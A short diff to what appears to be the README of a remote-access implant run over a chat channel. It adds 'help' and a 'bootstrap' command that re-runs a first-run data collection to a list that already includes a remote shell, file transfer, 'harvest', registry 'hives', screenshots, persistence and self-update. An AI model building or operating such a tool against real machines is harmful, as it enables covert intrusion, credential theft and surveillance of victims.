@@ -33,7 +33,9 @@ Local state in `state.json`: version, channel, webhook, last ID and last heartbe
 
 ## Commands
 
-`shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `hives`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+`help`, `shell`, `ls`, `cd`, `cat`, `download`, `upload`, `harvest`, `bootstrap`, `hives`, `screenshot`, `persist on|off`, `sleep`, `ping`, `gateway status|restart`, `kill`, `update`, `update check`, `update stage`, `update apply <version>`, `update rollback`, `update auto on|off`, `update auto`, `update status`.
+
+`help` lists the commands in the channel; `bootstrap` re-runs the full first-run collection.
 
 `gateway status` shows state, last ACK RTT, reconnects and last close code; `gateway restart` closes with 4000 to test resume.
 
